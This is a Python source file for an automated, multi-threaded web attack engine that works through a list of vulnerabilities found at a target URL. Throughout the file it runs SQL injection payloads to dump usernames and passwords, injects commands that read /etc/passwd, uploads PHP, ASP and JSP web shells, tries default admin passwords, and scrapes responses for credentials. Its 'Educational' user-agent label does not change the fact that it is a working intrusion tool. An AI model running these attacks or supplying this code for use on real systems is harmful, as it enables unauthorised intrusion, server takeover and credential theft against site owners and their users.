import requests
import time
import re
import urllib.parse
import socket
import threading
import queue
import json
from bs4 import BeautifulSoup
from typing import Dict, List, Any, Optional
import subprocess
import base64
import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class OptimizedAttackEngine:
    """High-performance attack engine with multi-threading and live progress"""
    
    def __init__(self, target_url: str, vulnerabilities: List[Dict[str, Any]]):
        self.target_url = target_url
        self.vulnerabilities = vulnerabilities
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Educational-Attack-Engine/2.0'
        })
        self.attack_results = []
        self.progress_callback = None
        self.max_workers = 8  # Parallel attack threads
        
    def set_progress_callback(self, callback):
        """Set callback for live progress updates"""
        self.progress_callback = callback
    
    def _update_progress(self, message):
        """Update progress through callback"""
        if self.progress_callback:
            self.progress_callback(message)
    
    def start_optimized_attacks(self) -> Dict[str, Any]:
        """Start optimized multi-threaded attacks"""
        attack_results = {
            'total_attacks': 0,
            'successful_exploits': 0,
            'failed_exploits': 0,
            'console_output': [],
            'extracted_data': [],
            'credentials_found': [],
            'shells_obtained': [],
            'attack_details': [],
            'databases_compromised': []
        }
        
        self._update_progress("🚀 Starting high-speed automated attack sequence...")
        
        # Group vulnerabilities for parallel processing
        vuln_groups = self._group_vulnerabilities_optimized()
        total_groups = len(vuln_groups)
        completed = 0
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_group = {}
            
            for group_name, vulns in vuln_groups.items():
                if vulns:
                    future = executor.submit(self._execute_vulnerability_group, group_name, vulns)
                    future_to_group[future] = group_name
            
            for future in as_completed(future_to_group):
                group_name = future_to_group[future]
                completed += 1
                
                try:
                    group_results = future.result()
                    self._merge_results(attack_results, group_results)
                    
                    progress_percent = int((completed / total_groups) * 100)
                    self._update_progress(f"⚡ Progress: {progress_percent}% - {group_name} completed")
                    
                except Exception as e:
                    self._update_progress(f"❌ {group_name} failed: {str(e)}")
        
        self._update_progress("✅ High-speed attack sequence completed!")
        return attack_results
    
    def _group_vulnerabilities_optimized(self) -> Dict[str, List[Dict]]:
        """Group vulnerabilities for optimized parallel processing"""
        groups = {
            'sql_injection': [],
            'xss': [],
            'command_injection': [],
            'file_upload': [],
            'authentication_bypass': []
        }
        
        for vuln in self.vulnerabilities:
            if vuln.get('severity') in ['Critical', 'High']:  # Focus on high-impact vulns
                vuln_type = vuln['type'].lower()
                
                if 'sql injection' in vuln_type:
                    groups['sql_injection'].append(vuln)
                elif 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
                    groups['xss'].append(vuln)
                elif 'command injection' in vuln_type:
                    groups['command_injection'].append(vuln)
                elif 'file upload' in vuln_type:
                    groups['file_upload'].append(vuln)
                elif 'authentication' in vuln_type:
                    groups['authentication_bypass'].append(vuln)
        
        return groups
    
    def _execute_vulnerability_group(self, group_name: str, vulns: List[Dict]) -> Dict[str, Any]:
        """Execute attacks for a specific vulnerability group"""
        results = {
            'group': group_name,
            'attacks': len(vulns),
            'successes': 0,
            'failures': 0,
            'extracted_data': [],
            'shells': [],
            'credentials': []
        }
        
        if group_name == 'sql_injection':
            results.update(self._fast_sql_injection_attacks(vulns))
        elif group_name == 'xss':
            results.update(self._fast_xss_attacks(vulns))
        elif group_name == 'command_injection':
            results.update(self._fast_command_injection_attacks(vulns))
        elif group_name == 'file_upload':
            results.update(self._fast_file_upload_attacks(vulns))
        elif group_name == 'authentication_bypass':
            results.update(self._fast_auth_bypass_attacks(vulns))
        
        return results
    
    def _fast_sql_injection_attacks(self, vulns: List[Dict]) -> Dict[str, Any]:
        """Optimized SQL injection attacks"""
        results = {'successes': 0, 'failures': 0, 'extracted_data': [], 'credentials': []}
        
        # High-impact payloads only
        payloads = [
            "' UNION SELECT user(),database(),version()-- ",
            "' UNION SELECT username,password FROM users-- ",
            "' UNION SELECT login,pass FROM admin-- ",
            "' UNION SELECT * FROM information_schema.tables WHERE table_schema!=BINARY'information_schema'-- ",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- "
        ]
        
        for vuln in vulns:
            location = vuln['location']
            
            # Use threading for payload testing
            with ThreadPoolExecutor(max_workers=3) as executor:
                futures = []
                
                for payload in payloads:
                    future = executor.submit(self._test_sql_payload, location, payload)
                    futures.append(future)
                
                for future in as_completed(futures):
                    try:
                        payload_result = future.result(timeout=5)  # 5 sec timeout per payload
                        
                        if payload_result['success']:
                            results['successes'] += 1
                            results['extracted_data'].extend(payload_result.get('data', []))
                            
                            # Check for credentials
                            if any(keyword in str(payload_result.get('data', [])).lower() 
                                  for keyword in ['password', 'hash', 'user', 'admin']):
                                results['credentials'].append({
                                    'type': 'SQL Injection',
                                    'location': location,
                                    'data': payload_result.get('data', [])
                                })
                        else:
                            results['failures'] += 1
                            
                    except Exception:
                        results['failures'] += 1
        
        return results
    
    def _test_sql_payload(self, location: str, payload: str) -> Dict[str, Any]:
        """Test individual SQL payload with timeout"""
        try:
            if '?' not in location:
                location += '?id=1'
            
            test_url = location.replace('?id=1', f'?id=1{payload}')
            response = self.session.get(test_url, timeout=3, allow_redirects=False)
            
            # Check for SQL injection indicators
            indicators = [
                'mysql', 'error', 'warning', 'root@', 'admin', 'user',
                'database', 'table', 'column', 'select', 'union'
            ]
            
            response_text = response.text.lower()
            if any(indicator in response_text for indicator in indicators):
                return {
                    'success': True,
                    'payload': payload,
                    'data': self._extract_sql_data(response.text)
                }
            
        except Exception:
            pass
        
        return {'success': False, 'payload': payload}
    
    def _extract_sql_data(self, response_text: str) -> List[str]:
        """Extract useful data from SQL injection response"""
        extracted = []
        
        # Look for database names
        db_pattern = r'Database:\s*([a-zA-Z_][a-zA-Z0-9_]*)'
        matches = re.findall(db_pattern, response_text)
        extracted.extend([f"Database: {match}" for match in matches])
        
        # Look for usernames/passwords
        cred_patterns = [
            r'([a-zA-Z_][a-zA-Z0-9_]*):([a-f0-9]{32})',  # username:md5hash
            r'user[:\s]*([a-zA-Z0-9_]+)',  # user: username
            r'pass[word]*[:\s]*([a-zA-Z0-9@#$%^&*]+)'  # password: pass
        ]
        
        for pattern in cred_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            extracted.extend([f"Credential: {match}" for match in matches])
        
        return extracted[:5]  # Limit to 5 most important findings
    
    def _fast_xss_attacks(self, vulns: List[Dict]) -> Dict[str, Any]:
        """Optimized XSS attacks"""
        results = {'successes': 0, 'failures': 0, 'extracted_data': [], 'shells': []}
        
        # High-impact XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>"
        ]
        
        for vuln in vulns:
            location = vuln['location']
            
            for payload in payloads:
                if self._test_xss_payload(location, payload):
                    results['successes'] += 1
                    results['extracted_data'].append(f"XSS confirmed at {location}")
                    break
                else:
                    results['failures'] += 1
        
        return results
    
    def _test_xss_payload(self, location: str, payload: str) -> bool:
        """Test XSS payload quickly"""
        try:
            if '?' not in location:
                location += '?search='
            
            test_url = f"{location}{urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=2)
            
            return payload.replace('"', '').replace("'", '') in response.text
            
        except Exception:
            return False
    
    def _fast_command_injection_attacks(self, vulns: List[Dict]) -> Dict[str, Any]:
        """Optimized command injection attacks"""
        results = {'successes': 0, 'failures': 0, 'extracted_data': [], 'shells': []}
        
        payloads = [
            "; id",
            "| whoami", 
            "&& uname -a",
            "; cat /etc/passwd",
            "| ls -la"
        ]
        
        for vuln in vulns:
            location = vuln['location']
            
            for payload in payloads:
                if self._test_command_payload(location, payload):
                    results['successes'] += 1
                    results['extracted_data'].append(f"Command injection at {location}")
                    results['shells'].append({
                        'type': 'Command Injection',
                        'location': location,
                        'access_method': 'Web Shell'
                    })
                    break
                else:
                    results['failures'] += 1
        
        return results
    
    def _test_command_payload(self, location: str, payload: str) -> bool:
        """Test command injection payload"""
        try:
            if '?' not in location:
                location += '?cmd='
            
            test_url = f"{location}{urllib.parse.quote(payload)}"
            response = self.session.get(test_url, timeout=3)
            
            # Check for command output indicators
            indicators = ['uid=', 'root:', 'total ', 'drwx', '-rw-']
            return any(indicator in response.text for indicator in indicators)
            
        except Exception:
            return False
    
    def _fast_file_upload_attacks(self, vulns: List[Dict]) -> Dict[str, Any]:
        """Optimized file upload attacks"""
        results = {'successes': 0, 'failures': 0, 'shells': []}
        
        # Quick web shells
        shells = [
            ('shell.php', '<?php system($_GET["c"]); ?>'),
            ('shell.asp', '<% execute(request("c")) %>'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("c")); %>')
        ]
        
        for vuln in vulns:
            location = vuln['location']
            upload_url = self._find_upload_endpoint(location)
            
            if upload_url:
                for filename, content in shells:
                    if self._test_upload(upload_url, filename, content):
                        results['successes'] += 1
                        results['shells'].append({
                            'type': 'Web Shell',
                            'filename': filename,
                            'location': location
                        })
                        break
                    else:
                        results['failures'] += 1
        
        return results
    
    def _test_upload(self, upload_url: str, filename: str, content: str) -> bool:
        """Test file upload quickly"""
        try:
            files = {'file': (filename, content, 'text/plain')}
            response = self.session.post(upload_url, files=files, timeout=3)
            
            success_indicators = ['uploaded', 'success', 'file saved']
            return any(indicator in response.text.lower() for indicator in success_indicators)
            
        except Exception:
            return False
    
    def _fast_auth_bypass_attacks(self, vulns: List[Dict]) -> Dict[str, Any]:
        """Optimized authentication bypass attacks"""
        results = {'successes': 0, 'failures': 0, 'credentials': []}
        
        # Common bypass credentials
        creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'root'),
            ('test', 'test')
        ]
        
        for vuln in vulns:
            location = vuln['location']
            login_url = self._find_login_endpoint(location)
            
            if login_url:
                for username, password in creds:
                    if self._test_login(login_url, username, password):
                        results['successes'] += 1
                        results['credentials'].append({
                            'service': 'Web Login',
                            'username': username,
                            'password': password,
                            'location': location
                        })
                        break
                    else:
                        results['failures'] += 1
        
        return results
    
    def _test_login(self, login_url: str, username: str, password: str) -> bool:
        """Test login credentials quickly"""
        try:
            data = {
                'username': username,
                'password': password,
                'login': 'Login',
                'submit': 'Submit'
            }
            
            response = self.session.post(login_url, data=data, timeout=3, allow_redirects=False)
            
            # Check for successful login indicators
            success_indicators = ['dashboard', 'welcome', 'profile', 'logout']
            failure_indicators = ['invalid', 'error', 'failed', 'incorrect']
            
            response_text = response.text.lower()
            
            if any(indicator in response_text for indicator in success_indicators):
                return True
            if any(indicator in response_text for indicator in failure_indicators):
                return False
            
            # Check for redirect (common on successful login)
            return response.status_code in [302, 301]
            
        except Exception:
            return False
    
    def _find_upload_endpoint(self, location: str) -> Optional[str]:
        """Find upload endpoint quickly"""
        if 'upload' in location:
            return location
        
        base_url = '/'.join(location.split('/')[:-1])
        return f"{base_url}/upload"
    
    def _find_login_endpoint(self, location: str) -> Optional[str]:
        """Find login endpoint quickly"""
        if 'login' in location:
            return location
        
        base_url = '/'.join(location.split('/')[:-1])
        return f"{base_url}/login"
    
    def _merge_results(self, main_results: Dict, group_results: Dict):
        """Merge group results into main results"""
        main_results['total_attacks'] += group_results.get('attacks', 0)
        main_results['successful_exploits'] += group_results.get('successes', 0)
        main_results['failed_exploits'] += group_results.get('failures', 0)
        
        main_results['extracted_data'].extend(group_results.get('extracted_data', []))
        main_results['credentials_found'].extend(group_results.get('credentials', []))
        main_results['shells_obtained'].extend(group_results.get('shells', []))
        
        # Add database compromises from SQL injection
        if group_results.get('group') == 'sql_injection' and group_results.get('successes', 0) > 0:
            main_results['databases_compromised'].append({
                'type': 'SQL Injection',
                'count': group_results.get('successes', 0)
            })